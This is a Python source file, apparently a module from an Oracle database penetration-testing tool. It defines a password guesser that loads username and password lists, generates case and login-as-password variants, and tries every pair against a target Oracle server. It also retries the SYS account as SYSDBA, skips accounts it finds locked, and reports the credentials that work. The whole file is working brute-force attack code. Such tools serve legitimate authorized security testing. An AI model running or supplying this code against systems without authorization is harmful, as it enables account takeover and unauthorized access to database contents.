#!/usr/bin/python
# -*- coding: utf-8 -*-

from OracleDatabase import OracleDatabase
from time import sleep
import logging, os.path
from Constants import *
from Utils import sidOrServiceNameHasBeenGiven, stringToLinePadded, getCredentialsFormated, getSIDorServiceNameWithType, getSIDorServiceName
from random import shuffle

class PasswordGuesser (OracleDatabase):
	'''
	Password guesser
	'''
	def __init__(self, args, accountsFile, loginFile=None, passwordFile=None, loginAsPwd=False, password=None, bothUpperLower=False, randomOrder=False, timeSleep=0):
		'''
		Constructor
		'''
		OracleDatabase.__init__(self,args)
		self.accountsFile = accountsFile
		self.loginFile = loginFile
		self.passwordFile = passwordFile
		self.loginAsPwd = loginAsPwd
		self.separator = args['separator']  # Separator for credentials
		self.bothUpperLower = bothUpperLower
		self.randomOrder = randomOrder
		self.password = password
		if self.accountsFile == '' :
			self.accounts = []
		else :
			self.accounts = self.__loadAccounts__()
		self.valideAccounts = {}
		self.args['SYSDBA'] = False
		self.args['SYSOPER'] = False
		self.timeSleep = timeSleep
		
	def getAccountsFromFile (self):
		'''
		return list which contains accounts
		'''
		return self.accounts

	def __loadAccounts__(self):
		'''
		Load credentials stored in file(s) according to contructor arguments.
		Impossible to have duplicate credentials.
		return a list containing each account
		e.g. [['login1','pwd1'], etc]
		'''
		accountsDict = {} #For saving temporarily credentials in a dict (of username)
		finalUniqAccounts = [] #Contain each uniq account e.g. [['login1','pwd1'], etc]
		logins = [] #For saving all logins when a login file and a pwd file are given
		passwords = [] #For saving all pwds when a login file and a pwd file are given
		if self.accountsFile != None:
			logging.info('Loading accounts stored in the uniq file {0}'.format(repr(self.accountsFile)))
			logging.info("Separator between login and password fixed on {0}".format(repr(self.separator)))
			f = open(self.accountsFile)
			for l in f:
				lsplit = l.replace('\n','').replace('\t','').split(self.separator)
				if isinstance(lsplit, list) and len(lsplit) == 2 :
					if lsplit[0] not in accountsDict:
						accountsDict[lsplit[0]] = [lsplit[1]]
					else:
						accountsDict[lsplit[0]].append(lsplit[1])
				else:
					logging.warning("The line {0} is not loaded in credentials list: {1}".format(repr(l), repr(lsplit)))
			f.close()
		elif self.loginFile!=None and self.password!=None:
			logging.info('Loading logins/usernames stored in the file {0} with the password {1}'.format(repr(self.loginFile), repr(self.password)))
			logins = self.__getLoginsList__()
			for aLogin in logins:
				accountsDict[aLogin] = [self.password]
		else:
			logging.info('Loading logins stored in {0} and passwords stored in {1}'.format(self.loginFile, self.passwordFile))
			logins = self.__getLoginsList__()
			passwords = self.__getPasswordsList__()
			for aLogin in logins:
				for aPwd in passwords:
					if aLogin not in accountsDict:
						accountsDict[aLogin] = [aPwd]
					else:
						accountsDict[aLogin].append(aPwd)
		if self.loginAsPwd == True:
			logging.info('Each login is saved as password (in lower case and upper case) if it is not done yet')
			for aLogin in accountsDict:
				if aLogin.lower() not in accountsDict[aLogin]:
					accountsDict[aLogin].append(aLogin.lower())
				if aLogin.upper() not in accountsDict[aLogin]:
					accountsDict[aLogin].append(aLogin.upper())
		if self.bothUpperLower == True:
			logging.info("Each password of each username is saved in lower case and upper case if it is not done yet")
			for aLogin in accountsDict:
				for aPwd in accountsDict[aLogin]:
					if aPwd.lower() not in accountsDict[aLogin]:
						accountsDict[aLogin].append(aPwd.lower())
					if aPwd.upper() not in accountsDict[aLogin]:
						accountsDict[aLogin].append(aPwd.upper())
		#Transform dictionary of accounts to list
		for aLogin in accountsDict:
			for aPwd in accountsDict[aLogin]:
				finalUniqAccounts.append([aLogin, aPwd])
		if self.randomOrder == True:
			shuffle(finalUniqAccounts)
		logging.info("{0} paired login/password loaded".format(len(finalUniqAccounts)))
		if len(finalUniqAccounts) == 0:
			logging.warning("0 login/password loaded. It seems there is an error with your account file")
		return finalUniqAccounts

	def __getLoginsList__(self):
		'''
		Returns logins stored in self.loginFile as a list.
		usernames are in lowercases.
		Remove duplicate usernames/logins.
		'''
		logins = []
		logging.debug("Loading usernames/logins stored in {0}...".format(repr(self.loginFile)))
		f = open(self.loginFile)
		for l in f:
			aLogin = l.replace('\n', '').replace('\t', '').lower()
			if aLogin not in logins:
				logins.append(aLogin)
		f.close()
		logging.debug("Usernames/logins loaded from {0}: {1} uniq usernames loaded".format(repr(self.loginFile), len(logins)))
		return logins

	def __getPasswordsList__(self):
		'''
		Returns passwords stored in self.passwordFile as a list
		Remove duplicate passwords
		'''
		passwords = []
		logging.debug("Loading password stored in {0}...".format(repr(self.passwordFile)))
		f = open(self.passwordFile)
		for l in f:
			aPwd = l.replace('\n', '').replace('\t', '')
			if aPwd not in passwords:
				passwords.append(aPwd)
		f.close()
		logging.debug("Passwords loaded from {0}: {1} uniq passwords loaded".format(repr(self.passwordFile), len(passwords)))
		return passwords

	def searchValideAccounts(self):
		'''
		Search valide accounts.
		By default, the constructor defines an attack thanks to ONE file wich contains usernames & passwords (with a separator).
		Return True if no error, owtherwise False (i.e. pb with accounts)
		'''
		userChoice = 1
		lockedUsernames = []
		logging.info("Searching valid accounts on {0}:{1}/{2}".format(self.args['server'], self.args['port'], getSIDorServiceNameWithType(self.args)))
		logging.debug("{0} accounts will be tested".format(len(self.accounts)))
		if len(self.accounts) == 0:
			return False
		pbar,nb = self.getStandardBarStarted(len(self.accounts)), 0
		for anAccount in self.accounts:
			nb += 1
			pbar.update(nb)
			self.args['SYSDBA'] = False
			self.args['SYSOPER'] = False
			logging.debug("Try to connect with {0}".format('/'.join(anAccount)))
			self.args['user'], self.args['password'] = anAccount[0], anAccount[1]
			self.__generateConnectionString__()
			status = self.__saveThisLoginInFileIfNotExist__(self.args['user'])
			if self.args['force-retry'] == False and status == False and userChoice in [1,3]:
				userChoice = self.__askToTheUserIfNeedToContinue__(self.args['user'])
			if userChoice == 0 : 
				logging.info("The attack is aborded because you choose to stop (s/S)")
				break
			if userChoice == 3:
				logging.info("Skip account {0} and continue to next one. Ask each time".format(repr(self.args['user'])))
			elif self.args['user'].lower() in lockedUsernames:
				logging.info("Skip this creds {0}/{1} because we known this account is locked".format(repr(self.args['user']),repr(self.args['password'])))
			else:
				status = self.connection(threaded=False)
				if status == True:
					self.valideAccounts[self.args['user']] = self.args['password']
					logging.info("Valid credential: {0} ({1})  ".format('/'.join(anAccount),self.args['connectionStr']))
					self.args['print'].goodNews(stringToLinePadded("Valid credentials found: {0}. Continue... ".format('/'.join(anAccount))))
				elif "connection as SYS should be as SYSDBA or SYSOPER" in str(status):
					logging.debug("Try to connect as sysdba")
					self.args['SYSDBA'] = True
					status = self.connection()
					if status == True:
						self.valideAccounts[self.args['user']] = self.args['password']
						logging.info("Valid credential: {0} ({1})  ".format('/'.join(anAccount),self.args['connectionStr']))
					self.args['SYSDBA'] = False
				elif self.__needRetryConnection__(status) == True:
					status = self.__retryConnect__(nbTry=4)
				elif self.ERROR_ACCOUNT_LOCKED in str(status):
					self.args['print'].printImportantNotice("{0} account is locked, so skipping this username for password".format(repr(self.args['user'])))
					#logging.debug("{0} account is locked, so skipping this username for password".format(repr(self.args['user'])))
					lockedUsernames.append(self.args['user'].lower())
				else:
					logging.debug("Error during connection with this account: {0}".format(status))
				self.close()
				sleep(self.timeSleep)
		pbar.finish()
		logging.debug("All these accounts are locked according to errors: {0}".format(lockedUsernames))
		return True

	def __saveThisLoginInFileIfNotExist__(self,login):
		''' 
		Save this login in the trace file to known if this login has already been tested
		If the login is in the file , return False. Otherwise return True
		'''
		if ('loginTraceFile' in self.args) == False:
			self.args['loginTraceFile'] = "{0}-{1}-{2}{3}".format(self.args['server'], self.args['port'], getSIDorServiceName(self.args), PASSWORD_EXTENSION_FILE)
			if os.path.isfile(self.args['loginTraceFile']) == False:
				f=open(self.args['loginTraceFile'],'w')
				f.close()
				logging.info("The {0} file has been created".format(self.args['loginTraceFile']))
		f=open(self.args['loginTraceFile'],'r')
		for l in f:
			aLoginInFile = l.replace('\n','')
			if login == aLoginInFile :
				f.close() 
				return False
		f.close()
		f=open(self.args['loginTraceFile'],'a')
		f.write('{0}\n'.format(login))
		f.close()
		return True

	def __askToTheUserIfNeedToContinue__(self,login):
		'''
		Ask to the user if the module need to continue
		return:
		- 0 : stop (no)
		- 1 : continue and ask again (yes)
		- 2 : continue without ask (yes) 
		'''
		def askToContinue ():
			rep = input("The login {0} has already been tested at least once. What do you want to do:\n- stop (s/S)\n- continue and ask every time (a/A)\n- skip and continue to ask (p/P)\n- continue without to ask (c/C)\n".format(login))
			if rep == 's' or rep == 'S' : return 0
			elif rep == 'a' or rep == 'A' : return 1
			elif rep == 'c' or rep == 'C' : return 2
			elif rep == 'p' or rep == 'P': return 3
			else : return -1
		rep = askToContinue()
		while (rep==-1):
			rep = askToContinue()
		return rep

def runPasswordGuesserModule(args):
	'''
	Run the PasswordGuesser module
	'''
	if sidOrServiceNameHasBeenGiven(args) == False : return EXIT_MISS_ARGUMENT
	args['print'].title("Searching valid accounts on the {0} server, port {1}".format(args['server'],args['port']))
	accountsFile = None
	accountsFiles = None
	loginFile = None
	passwordFile = None
	loginFile = None
	password = None
	if args['accounts-files'][0] != None and args['accounts-files'][1] != None :
		logging.debug("Login file and password file are given. 'accounts-file' option is disabled")
		loginFile = args['accounts-files'][0]
		passwordFile = args['accounts-files'][1]
	elif args['logins-file-pwd']!= None and args['logins-file-pwd'][0] != None and args['logins-file-pwd'][1] != None :
		logging.debug("Login file and a password are given. 'accounts-file' and 'accounts-files' options are disabled")
		loginFile = args['logins-file-pwd'][0]
		password = args['logins-file-pwd'][1]
	else:
		logging.debug("One file with accounts is given")
		accountsFile = args['accounts-file']
	passwordGuesser = PasswordGuesser(args,
									  accountsFile=accountsFile,
									  loginFile=loginFile,
									  passwordFile=passwordFile,
									  timeSleep=args['timeSleep'],
									  loginAsPwd=args['login-as-pwd'],
									  password=password)
	passwordGuesser.searchValideAccounts()
	validAccountsList = passwordGuesser.valideAccounts
	if validAccountsList == {}:
		args['print'].badNews("No found a valid account on {0}:{1}/{2}. You should try with the option '--accounts-file accounts/accounts_multiple.txt' or '--accounts-files accounts/logins.txt accounts/pwds.txt'".format(args['server'], args['port'], getSIDorServiceNameWithType(args)))
	else :
		args['print'].goodNews("Accounts found on {0}:{1}/{2}: {3}".format(args['server'], args['port'], getSIDorServiceNameWithType(args),getCredentialsFormated(validAccountsList)))



